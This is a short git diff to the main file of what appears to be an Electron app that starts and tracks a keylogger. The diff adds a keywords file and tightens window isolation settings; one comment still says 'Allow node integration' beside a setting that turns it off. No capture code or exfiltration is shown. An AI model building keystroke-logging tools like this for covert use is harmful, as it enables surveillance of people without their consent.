@@ -7,6 +7,14 @@ const { exec } = require('child_process');
 // Declare variables for the main window and keylogger process status
 let mainWindow;
 let keyloggerRunning = false; // Flag to track if the keylogger is running
+// Path to the keywords file
+const keywordsFilePath = path.join(__dirname, 'keywords.txt');
+
+if (!fs.existsSync(keywordsFilePath)) {
+  fs.writeFileSync(keywordsFilePath, '');  // Create an empty file if it doesn't exist
+}
+
+console.log('Keywords file path:', keywordsFilePath);
 
 // Function to create the main application window
 function createWindow() {
@@ -18,8 +26,8 @@ function createWindow() {
     height: 600,
     webPreferences: {
       preload: path.join(__dirname, 'preload.js'), // Preload script to handle communication between renderer and main processes
-      nodeIntegration: true, // Allow node integration
-      contextIsolation: false, // Disable context isolation
+      contextIsolation: true, // Enable context isolation
+      nodeIntegration: false, // Allow node integration
     },
   });
 
@@ -114,6 +122,7 @@ function startKeylogger() {
     console.log('Keylogger is already running');
   }
 }
+
 
 // Event handler when Electron app is ready to create the window
 app.on('ready', createWindow);
